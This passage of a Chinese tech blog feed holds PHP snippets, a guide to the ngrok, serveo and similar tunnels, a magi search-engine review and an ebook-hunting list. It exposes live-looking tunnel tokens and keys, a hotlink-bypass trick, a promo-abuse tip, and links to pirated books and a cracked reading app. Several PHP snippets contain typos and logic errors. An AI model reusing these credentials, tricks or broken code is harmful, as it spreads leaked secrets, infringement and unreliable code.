e-mail:kodcloud@qq.com * @copyright warlee 2014.(Shanghai)Co.,Ltd * @license http://kodcloud.com/tools/license/license.txt */ https://mkblog.cn/1831/ 孟坤大佬 /** * 安全读取文件，避免并发下读取数据为空 * * @param $file 要读取的文件路径 * @param $timeout 读取超时时间 * @return 读取到的文件内容 | false - 读取失败 */function file_read_safe($file, $timeout = 5) &#123; if (!$file || !file_exists($file)) return false; $fp = @fopen($file, 'r'); if (!$fp) return false; $startTime = microtime(true); // 在指定时间内完成对文件的独占锁定 do &#123; $locked = flock($fp, LOCK_EX | LOCK_NB); if (!$locked) &#123; usleep(mt_rand(1, 50) * 1000); // 随机等待1~50ms再试 &#125; &#125; while ((!$locked) &amp;&amp; ((microtime(true) - $startTime) &lt; $timeout)); if ($locked &amp;&amp; filesize($file) &gt;= 0) &#123; $result = @fread($fp, filesize($file)); flock($fp, LOCK_UN); fclose($fp); if (filesize($file) == 0) &#123; return ''; &#125; return $result; &#125; else &#123; flock($fp, LOCK_UN); fclose($fp); return false; &#125;&#125; /** * 安全写文件，避免并发下写入数据为空 * * @param $file 要写入的文件路径 * @param $buffer 要写入的文件二进制流（文件内容） * @param $timeout 写入超时时间 * @return 写入的字符数 | false - 写入失败 */function file_write_safe($file, $buffer, $timeout = 5) &#123; clearstatcache(); if (strlen($file) == 0 || !$file) return false; // 文件不存在则创建 if (!file_exists($file)) &#123; @file_put_contents($file, ''); &#125; if(!is_writeable($file)) return false; // 不可写 // 在指定时间内完成对文件的独占锁定 $fp = fopen($file, 'r+'); $startTime = microtime(true); do &#123; $locked = flock($fp, LOCK_EX); if (!$locked) &#123; usleep(mt_rand(1, 50) * 1000); // 随机等待1~50ms再试 &#125; &#125; while ((!$locked) &amp;&amp; ((microtime(true) - $startTime) &lt; $timeout)); if ($locked) &#123; $tempFile = $file.'.temp'; $result = file_put_contents($tempFile, $buffer, LOCK_EX); if (!$result || !file_exists($tempFile)) &#123; flock($fp, LOCK_UN); fclose($fp); return false; &#125; @unlink($tempFile); ftruncate($fp, 0); rewind($fp); $result = fwrite($fp, $buffer); flock($fp, LOCK_UN); fclose($fp); clearstatcache(); return $result; &#125; else &#123; flock($fp, LOCK_UN); fclose($fp); return false; &#125;&#125; 随机图像1234567&lt;?php$img_array = glob('images/*.&#123;gif,jpg,png,jpeg,webp,bmp&#125;', GLOB_BRACE);if(count($img_array) == 0) die('没找到图片文件。请先上传一些图片到 '.dirname(__FILE__).'/images/ 文件夹');header('Content-Type: image/png');echo(file_get_contents($img_array[array_rand($img_array)]));?&gt;https://mkblog.cn/1836/ PHP读取exe软件版本号12345678910111213141516171819202122232425262728/** * PHP 读取 exe\dll 文件版本号 * * @auth @腾讯电脑管家(https://zhidao.baidu.com/question/246143241010222924.html) * @param $filename 目标文件 * @return 读取到的版本号https://mkblog.cn/1712/ */function getFileVersion($filename)&#123; $fileversion = &apos;&apos;; $fpFile = @fopen($filename, &quot;rb&quot;); $strFileContent = @fread($fpFile, filesize($filename)); fclose($fpFile); if($strFileContent) &#123; $strTagBefore = &apos;F\0i\0l\0e\0V\0e\0r\0s\0i\0o\0n\0\0\0\0\0&apos;; // 如果使用这行，读取的是 FileVersion // $strTagBefore = &apos;P\0r\0o\0d\0u\0c\0t\0V\0e\0r\0s\0i\0o\0n\0\0&apos;; // 如果使用这行，读取的是 ProductVersion $strTagAfter = &apos;\0\0&apos;; if (preg_match(&quot;/$strTagBefore(.*?)$strTagAfter/&quot;, $strFileContent, $arrMatches)) &#123; if(count($arrMatches) == 2) &#123; $fileversion = str_replace(&quot;\0&quot;, &apos;&apos;, $arrMatches[1]); &#125; &#125; &#125; return $fileversion;&#125; 百度当图床123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?php /** * 上传图片到百度识图接口，获取图片外链 * * @param $file 图片文件 * @return 图片链接(上传成功) NULL(上传失败) * @copyright (c) mengkun(https://mkblog.cn/1619/) */function uploadToBaidu($file) &#123; // API 接口地址 $url = 'http://image.baidu.com/pcdutu/a_upload?fr=html5&amp;target=pcSearchImage&amp;needJson=true'; // 文件不存在 if(!file_exists($file)) return ''; // POST 文件 if (class_exists('CURLFile')) &#123; // php 5.5 $post['file'] = new CURLFile(realpath($file)); &#125; else &#123; $post['file'] = '@'.realpath($file); &#125; // CURL 模拟提交 $ch = curl_init(); curl_setopt($ch, CURLOPT_URL , $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $post); $output = curl_exec($ch); curl_close($ch); // 返回结果为空（上传失败） if($output == '') return ''; // 解析数据 $output = json_decode($output, true); if(isset($output['url']) &amp;&amp; $output['url'] != '') &#123; return $output['url']; &#125; return '';&#125; 在获取到的链接前面加上 https://image.baidu.com/search/down?tn=download&amp;url= 可以绕过防盗链，并且 https 一步到位// 使用示例：https://mkblog.cn/1619/comment-page-1/#comments$url = uploadToBaidu('1.jpg');echo $url; 变量的作用域12345678910111213141516171819202122232425262728293031323334方法一：使用 global 关键字function updateCounter()&#123; global $counter; $counterr++;&#125;$counter = 10;updateCounter();echo $counter; // 11方法二：使用 PHP 中的 $GLOBALS 数组https://learnku.com/articles/39670function updateCounter()&#123; $GLOBALS[counter]++:&#125;$counter = 10;updateCounter();echo $counter; // 11静态变量 ( static )静态变量在一个函数中被多次调用时，其值不会丢失，但此变量仅在函数内时可见的。function updateCounter()&#123; static $counter = 0; $counter++; echo "Static counter is now &#123;$counter&#125;\n";&#125;$counter = 10;updateCounter(); // Static counter is now 1updateCounter(); // Static counter is now 2 // 不会再被付初始值echo "Global couter is &#123;$couter&#125;\n"; // Global counter is 10 php 时间差1234567891011121314151617181920212223242526$dateTimeOne = '00:00:40';$dateTimeTwo = '00:00:50';$timeOne = explode(':', $dateTimeOne);$timeTwo = explode(':', $dateTimeTwo);$hour = $timeOne[0] + $timeTwo[0];$min = $timeOne[1] + $timeTwo[1];$sec = $timeOne[2] + $timeTwo[2];$newS = $sec / 60; //得到分钟数$newS1 = $sec % 60; //得到秒数$newM = $min / 60; // 得到小时数$newM1 = $min % 60; //得到分钟$newH = $hour / 60; // 得到天数$newH1 = $hour % 60; // 得到小时数$min = floor($newS + $newM1);$sec = floor($newS1);$hour = floor($newM + $newH1);echo $hour . ':' . $min . ':' . $sec;https://learnku.com/articles/39760 php-fpm 5021234567891011php-fpm.conf 的配置 ，静态模式，动态模式，内存模式1：静态适合 大内存的，2： 适合内存适合 4g,2g3：微内存的模式 适合 512 ，256 的内存进程数 的配置 根据 cpu 核数 和内存 / 30M 的设置 一般一个 worker 进程占 30m 大小502 ，504 错误处理502 网关错误，php-fpm 进程无法处理 大量的请求，导致的504 而是 请求过去，php-fpm 处理超时，无法返回请求导致的https://learnku.com/articles/39903 php读取大文件12345678910111213141516171819202122232425262728293031323334353637383940414243memory_get_peak_usage();function formatBytes($bytes, $precision = 2) &#123; $units = array("b", "kb", "mb", "gb", "tb"); $bytes = max($bytes, 0); $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); $pow = min($pow, count($units) - 1); $bytes /= (1 &lt;&lt; (10 * $pow)); return round($bytes, $precision) . " " . $units[$pow];&#125;function readTheFile($path) &#123; $lines = []; $handle = fopen($path, "r"); while(!feof($handle)) &#123; $lines[] = trim(fgets($handle)); &#125; fclose($handle); return $lines;&#125;readTheFile("shakespeare.txt");function readTheFile($path) &#123; $handle = fopen($path, "r"); while(!feof($handle)) &#123; yield trim(fgets($handle)); &#125; fclose($handle);&#125;$zip = new ZipArchive();$filename = "filters-1.zip";$zip-&gt;open($filename, ZipArchive::CREATE);$zip-&gt;addFromString("shakespeare.txt", file_get_contents("shakespeare.txt"));$zip-&gt;close();https://learnku.com/php/t/39751 phpdocker 镜像网站 docker 神器之 「lnmp 环境篇」 PHP 学习笔记之正则表达式 阿里云视频点播转码 京东大商户对接 API 阿里云 OSS 上传 PHP 略缩图裁剪插件 composer自动加载原理 对话机器人框架 CommuneChatbot 数组增强组件 开源文档管理系统 Wizard PhpStorm 中使用 PHP Inspections 进行代码静态分析 php开发技术栈导图 聊天系统代码 php添加水印和缩略图 获取 AppStore 信息 PHP Excel 扩展 xlswriter PHP权限库支持 ACL,RBAC,ABAC 等权限控制 Excel读写工具php excel Leetcode 二叉树题目集合 使用简单实用的语义化接口快速读写Excel文件composer PHP中的危险函数和伪协议 一次获取客户端 IP 记录 PHP 开发者实践 php websocket PHP启示录 腾讯优图 OCR Composer 包 阿里巴巴开放平台php sdk 机器学习PHP库 ThinkPHP6.0 核心分析汇总 PHP通过反射实现自动注入参数 PHP中常见的设计模式 php leetCode 的学习 《PHP 微服务练兵》系列教程 php excel扩展 laravel guzzle爬虫 PHP7 的垃圾回收机制 微博机器人 大型网站技术架构 在谷歌浏览器输入 URL 回车之后发生了什么 电商秒杀超卖解决方案 高并发设计笔记 php爬虫]]></content>
  </entry>
  <entry>
    <title><![CDATA[有了内网穿透神器 ngrok ，个人电脑也能做服务器]]></title>
    <url>%2F2019%2F11%2F13%2F%E6%9C%89%E4%BA%86%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E7%A5%9E%E5%99%A8-ngrok-%EF%BC%8C%E4%B8%AA%E4%BA%BA%E7%94%B5%E8%84%91%E4%B9%9F%E8%83%BD%E5%81%9A%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[平常我们访问的网站都是由具有公网ip的服务器提供的，如果想做自己的网站也得要有个自己的服务器（当然也可以使用GitHub这种做静态网站，下次可以说说），其实服务器简单来说也就是一台电脑而已，那可不可以将自己的电脑做服务器呢？答案是可以的，这里推荐一个免费的内网穿透神器 ngrok，关于什么是内网穿透看百科解释：12内网穿透，即NAT穿透，网络连接时术语，计算机是局域网内时，外网与内网的计算机节点需要连接通信，映射端口能让外网的电脑找到处于内网的电脑，提高下载速度。 简单来说就是通过ngrok 可以生成一个外网地址，然后找到到本地服务器就可以访问自己电脑的文件，具体如何使用ngrok内网穿透如下，非常简单。 搭建本地服务器首先在自己电脑新建一个文件 index.html ，内容自己随意写了，然后搭建一个简单的服务器，可以通过ip和端口访问到这个文件。 比如我本机装了php，执行一行命令就可以 。1php -S localhost:4000 然后浏览器打开 localhost:4000 就能访问到本地的文件 index.html，这是一个周杰伦的个人PPT介绍，空格键翻页，和平常使用的PPT一样。 python 也是一样的。12λ python -m http.server 4000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:4000/) ... 如果对命令行不熟悉直接安装个软件NGINX https://www.nginx.com/ 直接启动就行。 ngrok ngrok软件官网 https://dashboard.ngrok.com/get-started我用谷歌账号直接登录，也可以自己用邮箱注册，然后copy 自己的token。下载软件（对应自己的电脑系统）到本地后，在cmd命令行执行ngrok authtoken 1THs9sajgDwQV1RS5ER6pc6nHo2_7gVJGSiAzT91YpAiS7f541234567891011121314# ngrok authtoken 1THs9sajgDwQV1RS5ER6pc6nHo2_7gVJGSiAzT91YpAiS7f54Authtoken saved to configuration file: C:\Users\xx/.ngrok2/ngrok.ymlngrok by @inconshreveable (Ctrl+C to quit)Session Status onlineAccount (Plan: Free)Version 2.3.35Region United States (us)Web Interface http://127.0.0.1:4040Forwarding http://7ef9b347.ngrok.io -&gt; http://localhost:4000Forwarding https://7ef9b347.ngrok.io -&gt; http://localhost:4000Connections ttl opn rt1 rt5 p50 p90 0 0 0.00 0.00 0.00 0.00 浏览器打开http://7ef9b347.ngrok.io 就可以打开自己电脑的文件 index.html，同样可以在命令行中可以看到访问到的文件。效果如图 命令行中的 Web Interface 是 Ngrok 内置的一个管理面板，用来展示所有通过 Ngrok 进来的请求信息以及返回的数据，现在我们访问一下 http://127.0.0.1:4040 看看。 现在你有了一个自己的域名http://7ef9b347.ngrok.io ，发给别人也能访问了，不过你的电脑不能关机，是不很简单，不过这个国外服务器有点慢，可以考虑国内的ngrok.cc。 ngrok.cc用邮箱注册 https://www.ngrok.cc/user.html ，详细教程见 http://www.ngrok.cc/_book/ 这个也是免费的。购买免费版本，然后设置基本信息，如果需要可以设置需要密码访问。下载对应系统的软件https://www.ngrok.cc/download.html，配置文件设置好你要的域名，比如我的susheng，Windows下直接启动文件 Sunny-Ngrok启动工具.bat 然后输入隧道id c4237a7e0be3bdad（登录后在隧道管理中复制） 浏览器访问 http://susheng.free.idcfengye.com 就可以了，很简单吧。 https://nat.cdjxt.net/#section-home 这个和 ngrok.cc 类似 ，先下载客户端，配置教程见 https://nat.cdjxt.net/#section-pricing ，然后用邮箱直接注册命令行执行client_windows_amd64.exe -s jp.cdjxt.net -p 5993 -k 9e9ef6b89342454f9c554d83a2a94b8e -ssl true可以看到运行成功了。 浏览器访问 https://m30059.jp.cdjxt.net/#/start 看效果。 如果嫌装客户端麻烦，可以直接使用这个serveo serveohttps://serveo.net/ 只要在命令行执行一行命令（需要先安装ssh命令，可以直接装一个git bash就行）123ssh -R 80:localhost:4000 serveo.netForwarding HTTP traffic from https://habeo.serveo.netPress g to start a GUI session and ctrl-c to quit. 浏览器访问 https://habeo.serveo.net 就能访问到自己电脑的文件了。 现在有了内网穿透你出门在外也可以访问到自己电脑上的文件了（当然你的电脑不能关机），如果还是嫌内网穿透麻烦，还不稳定，还是建议买个自己的服务器，这里推荐下腾讯云的，一年只要88 https://cloud.tencent.com/act/double11 ，昨天双十一我刚买了一台（如果是老用户，用一个新微信注册绑定同一个身份证就行），非广告，腾讯也没给我广告费。 推荐阅读: 如何发一条空白的朋友圈 那些在国内还能使用的谷歌产品 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 公众号苏生不惑原创文章整理 不会写Python代码如何抓取豆瓣电影 Top 250 Python 词云分析周杰伦新歌《说好不哭》 跟随时光机回到过去看看 2005 年的百度/腾讯/淘宝/谷歌 公众号：苏生不惑 其他Mac 安装使用 Ngrok https://learnku.com/articles/36129内网穿透神器 Ngrok 的使用https://learnku.com/articles/36003https://www.jianshu.com/p/33d0a8f77961https://www.cpolar.com/https://learnku.com/articles/36129#reply116370可以实现内网穿透的几款工具https://my.oschina.net/ZL520/blog/2086061Ngrok Natapp 小米球 Sunny-Ngrok echosite Ssh、autossh Lanproxy Spike frp fcn 花生壳内网穿透多款工具测试 https://hacpai.com/article/1568482350815内网穿透工具浅评 https://www.v2ex.com/t/575865smarGate： https://github.com/lazy-luo/smarGateFrp： https://github.com/fatedier/frpNgrok： https://github.com/inconshreveable/ngrokhttps://github.com/cnlh/nps/有哪些简单实用的端口映射（内网穿透）软件工具？https://www.zhihu.com/question/49629610https://qydev.com/download.html ngork http://help.qydev.com/1242213量子互联https://www.nsloop.com/内网穿透新章法 serveohttps://hacpai.com/article/1564394400425https://www.moerats.com/Aria2/#!/downloadinghttps://hacpai.com/article/1568482350815 https://cloud.tencent.com/developer/article/1507091https://github.com/fatedier/frp/blob/master/README_zh.mdfrp https://www.hi-linux.com/posts/25686.html https://natapp.cn/https://github.com/ffay/lanproxyhttps://juejin.im/post/5cad5e675188251b1b2f5517https://manager.xiaomiqiu.com/index如果没有服务器的话推荐个免费的 https://www.natfrp.com/内网穿透工具(替代 ngrok 和花生壳) https://github.com/longshengwang/tcpthrough-serverFCN 一键免费穿透，日常维护管理基本够用了https://cn.v2ex.com/t/617484#reply86 ssh -R 20001:localhost:80 root@a.a.a.a 或者 autossh -p22 -M 5000 -NR 20001:0.0.0.0:80 root@a.a.a.a，autossh 会一直尝试重新连接 可以消除网络故障隐患，ssh 透传的缺陷是透传到外网的端口只能监听 127 zerotier，非常好用的内网穿透方案，可以把多个内网机器组一个局域网，然后使用一个有公网IP的机器或者vps做中转节点(moon)进行加速，这样就把多个内网机器+一个公网机器组成了一个本地局域网: https://jiajunhuang.com/sharing#250 亲爱的小伙伴： 超好用内网映射神器 免费的内网穿透服务，轻松在自家电脑搭建网站 https://www.natfrp.com/十分钟快速搭建内网穿透工具 —— frp https://gleehub.com/tool/%E5%8D%81%E5%88%86%E9%92%9F%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%20%E2%80%94%E2%80%94%20frp.html( https://www.natfrp.org/) 是一个免费的内网穿透平台Frp内网穿透https://www.yangchong.top/2019/03/13/Frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发 https://github.com/cnlh/nps内网穿透 https://github.com/txthinking/mr2Fcn 傻瓜式内网穿透软件https://github.com/boywhp/fcn https://syncthing.net/https://github.com/ssstk/cngrok比 frp 更好用的内网穿透工具 npshttps://github.com/cnlh/nps https://github.com/KunTengRom/xfrp https://nps.hanxi.info/login/register frp 也有人写了面板 https://www.natfrp.org/npshttp://nav.xiejiahe.com/#/index?page=3我安利一个比较偏门，偏开发者的应用，内网穿透，http://www.notr.tech 。一条命令搞定。 内置免费 mr2 服务器, 将本地服务器暴露在外网 npm install -g @txthinking/mr2 https://www.v2ex.com/t/568236#reply25 https://github.com/txthinking/mr2]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[比谷歌更有意思的知识提取搜索引擎 magi]]></title>
    <url>%2F2019%2F11%2F11%2F%E6%AF%94%E8%B0%B7%E6%AD%8C%E6%9B%B4%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E7%9F%A5%E8%AF%86%E6%8F%90%E5%8F%96%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E-magi%2F</url>
    <content type="text"><![CDATA[关于搜索引擎之前写过那些你可能不知道的搜索奇技淫巧 那些除百度以外你可能不知道的小众搜索引擎那些你可能不知道的百度产品那些在国内还能使用的谷歌产品 doge搜索之前提到的doge搜索还是不错的，如果用不了谷歌可以推荐使用这个（想用谷歌在公众号回复 谷歌），另外还有人开发了个油猴脚本https://greasyfork.org/zh-CN/scripts/391784，给百度、360、搜狗、必应等搜索引擎的结果页加入多吉搜索按钮，一键跳转到多吉搜索进行相同关键词的检索。 比如搜最近大热的电影《小丑》（可以在公众号回复 小丑 获取电影），右侧可以看到doge搜索按钮 。点击跳转到doge magi不过最近发现的一个搜索引擎magi http://magi.com 很有意思，它用AI 梳理互联网的知识引擎，通过机器学习将互联网上的海量信息构建成可解析、可检索、可溯源的结构化知识体系。由微博博主@peakji开发，微博地址 https://www.weibo.com/1811148004/If71blQWC界面是这样的，看起来没什么不一样。其实magi几年前就有了，36kr在2015年还报道过https://36kr.com/p/220307 ，不知道为什么今年才上线。 不过和谷歌不一样的是它的搜索结果是以结构化知识呈现，按照可靠程度标记颜色为绿色（较为可靠）、黄色（一般）、红色（尚不足以验证可靠性），类似于 Wolfram Alpha http://www.wolframalpha.com/ ，而且（暂时）没有广告。 比如搜 微信 直接展示出这是个国民应用 ，是一种生活方式，用户超10亿，创始人张小龙，2011年出品，一眼就了解清楚搜索的这个词。 往下翻的结果就类似谷歌了，给出了链接地址，不过没有分页（不方便），而要一直点加载更多。搜一下电影名字，很快能了解这部电影的基本信息。下面这个搜索结果不知道会不会被公关掉。pgone 这个搜索结果有亮点 搜 世界上最美的女人 结果是妈妈，没毛病。 当然它也是有缺陷的，比如搜 北京时间 展示结果很奇怪。不如谷歌直接，像这种词还是用谷歌吧。搜双十一销售额不对。其他更多使用方法见官网 https://www.peak-labs.com/docs/zh/magi/help 最后建议magi起个中文名，方便传播，还有ui配色改改，总之magi还是挺有意思的，你也可以搜索试试。 其他这个来自中国的知识提取引擎，看起来比百度还好用一丢丢 https://www.huxiu.com/article/325126.html如何评价 Peak Labs 出品的 2019 版 Magi 搜索引擎MAGI名字是取自EVA里的超级电脑吗？https://cn.v2ex.com/t/616918?p=1 推荐阅读: 如何发一条空白的朋友圈 那些在国内还能使用的谷歌产品 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 公众号苏生不惑原创文章整理 不会写Python代码如何抓取豆瓣电影 Top 250 Python 词云分析周杰伦新歌《说好不哭》 跟随时光机回到过去看看 2005 年的百度/腾讯/淘宝/谷歌 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何快速找到电子书《明朝那些事儿》]]></title>
    <url>%2F2019%2F11%2F06%2F%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E6%89%BE%E5%88%B0%E7%94%B5%E5%AD%90%E4%B9%A6%E3%80%8A%E6%98%8E%E6%9C%9D%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF%E3%80%8B%2F</url>
    <content type="text"><![CDATA[周末在b站看完了纪录片《大明1644》https://www.bilibili.com/video/av232309/ 看完真是感慨万千，孤家寡人崇祯面对东林党那些老油条可真是无奈啊，最后的迁都希望都破灭了（当然也怪他自己，误杀袁崇焕，抓李自成后又放走，逼孙传庭出征，我都怀疑他是满清的卧底），于是大明在1644年挂了，附一段他最后的遗言，相比满清还算有骨气。 朕自登极十七年，逆贼直逼京师。虽朕薄德藐躬，上干天咎，然皆诸臣之误朕也。朕死无面目见祖宗于地下，去朕冠冕，以发覆面，任贼分裂朕尸，勿伤百姓一人。 看完不过瘾，于是想找当年明月的《明朝那些事儿》来看，这本书讲述了从1344年到1644年，明朝三百年间的历史，作品以史料为基础，以年代和具体人物为主线，运用小说的笔法，对明朝十七帝和其他王公权贵和小人物的命运进行全景展示，尤其对官场政治、战争、帝王心术着墨最多。这也是一部明朝政治经济制度、人伦道德的演义。大学的时候看过一部分，非常精彩，于是开始找这本书的电子书，也顺便整理下找电子书的网站/工具。 谷歌第一个自然想到谷歌了，在书名关键词后加上格式如pdf/epub/mobi/azw3/txt等第二个链接直接就能在线预览了http://www.sssch.net/Admin/ckfinder/userfiles/files/shujixiazai/wodeshudan/%E6%98%8E%E6%9C%9D%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF%EF%BC%88%E5%85%A8%E9%9B%86%EF%BC%89.pdf点击下载就行了。 如果有些书搜不到，可以看看下面的专业电子书网站。 epub 转 mobi 格式有时候需要将 epub 转换成 mobi 格式，可以使用这个在线工具 https://ebook.online-convert.com/convert-to-mobi另外分享个电脑上阅读equb格式电子书软件 https://pan.baidu.com/s/1NFE3ie2yoVnvvjQuca6wtg 提取码: n2hm对应的还有中文版http://cn.epubee.com/ 三秋书屋一个可免费下载电子书的网站 https://www.d4j.cn/找到《明朝那些事》的地址 https://www.d4j.cn/8033.html ，提供了百度网盘链接 鸠摩搜书https://www.jiumodiary.com/ 这个网站比较知名，直接提供网盘链接https://pan.baidu.com/s/1dF7bmSh，还有各种格式。 虫部落https://ebook.chongbuluo.com/ 左侧集合了很多电子书网站，切换搜索就行，再也不用记那么多网址。 豆瓣资源下载大师 1 秒搞定豆瓣电影 | 音乐 | 图书下载，这是一个油猴脚本https://greasyfork.org/zh-CN/scripts/329484 ，在豆瓣搜索到书的链接 https://book.douban.com/subject/3674537/ 右侧可以看到推荐的搜索结果相当全面，包含在线阅读，图书搜索·，免费图书网站，在线听书，再也不用你一个个找了。 关于油猴的使用参考之前的文章 Chrome 浏览器扩展神器油猴 另外分享个豆瓣图书排行榜https://alxddh.github.io/apps/douban-book-rank.html 如果你也对明朝感兴趣推荐一部2007年的电视剧《大明王朝1566》和一部2013年的电影《大明劫》，公众号回复大明劫获取。 其他豆瓣爬虫http://www.yournovel.cn/search?wd=%E6%98%8E%E6%9C%9D%E9%82%A3%E4%BA%9B%E4%BA%8B醒客读书http://www.xkreading.com/免费计算机电子书籍下载网站 http://www.banshujiang.cn/资源搜索导航网站，内容：学术搜索，电子书，图书馆，图片，知识库等https://scholar.chongbuluo.com一键生成个人微信朋友圈数据电子书https://github.com/sushengbuhuo/examples-of-web-crawlers会上网就会下载电子书苦瓜https://www.kgbook.com/去中心化电子书下载。https://ebook.lorefree.com/一个清新简洁并且功能强大的免费电子书下载网站http://www.xkreading.com/书享家，一个电子书下载导航网站 http://shuxiangjia.cn/鸠摩搜书 https://www.jiumodiary.com/电子书格式转换网站 http://cn.epubee.com/子午书简 https://5kindle.com/周读 http://www.ireadweek.com/书语者 https://iseex.github.io/2019-02/electronic-books/https://epubw.com/ https://epubw.xyz/ 搜索下载原版教材pdf版和视频资料 http://www.hejizhan.com/html/search解决你的电子书需求问题https://hdpdf.blog/超级书库https://shuayouxi.cn/ 电子书格式的转换，可以在这里书格|www.shuge.orghttps://calibre-ebook.com/download安装好此脚本之后，我们在豆瓣上打开书籍，脚本即自动进行搜索电子书搜索 https://i-book.in/?q=%E6%98%8E%E6%9C%9Dhttps://www.enjing.com/https://yabook.org/https://kindle.51nazhun.pub/http://ibooks.org.cn/https://hdpdf.blog/http://neikuw.com/免费电子书下载网站推荐 https://www.zhyong.cn/posts/417d/电子书阅读软件推荐 https://www.zhyong.cn/posts/59a8/经常喜欢下载一些电子书，电子书常见的格式有.azw3，.epub，.mobi 等，或者更加常见的.pdf 格式。.pdf 格式只需要一款 pdf 阅读器即可打开，但是对于.azw3，.epub，.mobi 等格式，必须要特定的软件才能打开，因此非常需要一款 PC 端的电子书阅读器。这里推荐个人使用的两款电子书阅读软件，体验都很不错https://github.com/kovidgoyal/calibrehttp://www.refrelent.com/豆瓣图书排行榜 https://alxddh.github.io/apps/douban-book-rank.html强大的 PDF 阅读器 Foxit: yaourt foxithttps://chrome.google.com/webstore/detail/pdf-viewer/oemmndcbldboiebfnladdacbdfmadadm?hl=zh-CN我的小书屋类似的网站 布克书屋 https://www.bukebook.cn/文献检索网站，繁简体检索够可以，里边有《四部丛刊》《四库全书》《永乐大典》和佛教道教文献，常用工具里面，还有标点过录和校对软件。最重要的是这个网站是免费的。 ​​​​ http://www.xueheng.net/http://www.iamtxt.com/ https://weibo.com/5613051720/IadtIyqyY我的小书屋类似的网站 布克书屋 https://www.bukebook.cn/文献检索网站，繁简体检索够可以，里边有《四部丛刊》《四库全书》《永乐大典》和佛教道教文献，常用工具里面，还有标点过录和校对软件。最重要的是这个网站是免费的。 ​​​​ http://www.xueheng.net/解决你的电子书需求问题。 http://www.6soluo.com/?p=641http://www.hejizhan.com/html/search 可以搜索下载原版教材pdf版和视频资料之类的阅读在线书源库 http://ku.iszoc.com/解决你的电子书需求问题。 http://www.6soluo.com/?p=641一个免费电子书资源下载网站，可直接下载👏格式包含kindle、epub、mobi、azw3、pdf https://epubw.com/https://www.tuishujun.com/功能：1.可自由分享书源。2.多种书源导入方式，网络导入，二维码导入，代码导入，*WEB一键导入（开启WEB服务）！3.提供阅读书源在线批量编辑（开启WEB服务） 源仓库 地址 http://ku.mumuceo.com阅读APP下载地址：酷安下载：https://www.coolapk.com/apk/com.gedoor.monkeybook作者GitHub: https://github.com/gedoor/MyBookshelf/releases https://www.52pojie.cn/thread-1040287-1-1.html https://www.jiumodiary.com/ http://www.ucdrs.superlib.net/ https://b-ok.org/http://www.pdfzj.com/ https://www.kgbook.com/现在已经叫全球数字图书馆项目了 https://www.cadal.cn/index/home#page1一个免费电子书资源下载网站，可直接下载👏111个搜书网站小集，能找到 99% 的电子书 https://weibo.com/3109939781/I2Ej23FRs有时候需要将 epub 转换成 mobi 格式，一般我都使用这个在线工具https://ebook.online-convert.com/convert-to-mobi苦瓜书盘是一个功能强大的书籍搜索网站，它的书籍分类十分全面。 苦瓜书盘是供网友交流适合电纸书阅读的6寸pdf及mobi格式电子书制作技术的网站，提供电子书分享的平台。https://www.kgbook.com/全民追书神器 V1.3.2.655高级完美版，各种付费小说免费看，告别书荒 https://www.52pojie.cn/thread-1040231-1-1.html格式包含kindle、epub、mobi、azw3、pdf https://epubw.com/清华大学图书馆网站真是良心之作，227个数据库，数以万计的图书，论文，视频等学术资源都是免费提供的。看小说神器「阅读」 的书源平台 https://www.52pojie.cn/thread-1040287-1-1.html 源仓库 地址 http://ku.mumuceo.com https://github.com/gedoor/MyBookshelf/releases11个搜书网站小集，能找到 99% 的电子书 https://weibo.com/3109939781/I2Ej23FRshttps://www.jiumodiary.com/ http://www.ucdrs.superlib.net/ https://b-ok.org/http://www.pdfzj.com/ https://www.kgbook.com/现在已经叫全球数字图书馆项目了 https://www.cadal.cn/index/home#page1 电子书第一个是周读，网址为：http://www.ireadweek.com #每天分享一个有用的 Bookset 是一个质量很高的精品电子书籍网站。它提供了丰富的书籍，并且网站的电子书籍的更新频率非常快，网站的电子书籍你也都可以直接下载。 https://bookset.me/ 电子书 https://ebook.chongbuluo.com/电子书搜索导航网站👏，Google，鸠摩，百度搜书，ePUBee，LibGen，书格，数字图书馆等 其中用Google搜索搜电子书的方法，书名关键词后加上格式（pdf/epub/mobi/azw3/txt）。 【1】书名 + 格式；例如：巴黎圣母院 pdf。 【2】书名 + filetype/inurl:格式 ；例如：格林童话 filetype:mobi ; 三个火枪手 inurl:pdf。 【3】书名 + 提取码 ；例如：三体 提取码。找电子图书与各类资源的必备和利器 https://weibo.com/ttarticle/p/show?id=2309404375054149412725数字图书馆推广工程 是由国家图书馆带头的一个公益性网站。 汇集国内各省市图书馆于一站，主要提供免费的图书、杂志、有声读物在线浏览。分类齐全，资源众多，可随时切换国内任一家图书馆，而且都是免费看。 http://www.ndlib.cn/【明史 历史公开课合集】 https://weibo.com/5888006271/Ie4py8WIc?type=comment#_rnd1572787605522推荐阅读: 如何发一条空白的朋友圈 那些在国内还能使用的谷歌产品 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 公众号苏生不惑原创文章整理 不会写Python代码如何抓取豆瓣电影 Top 250 Python 词云分析周杰伦新歌《说好不哭》 跟随时光机回到过去看看 2005 年的百度/腾讯/淘宝/谷歌 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
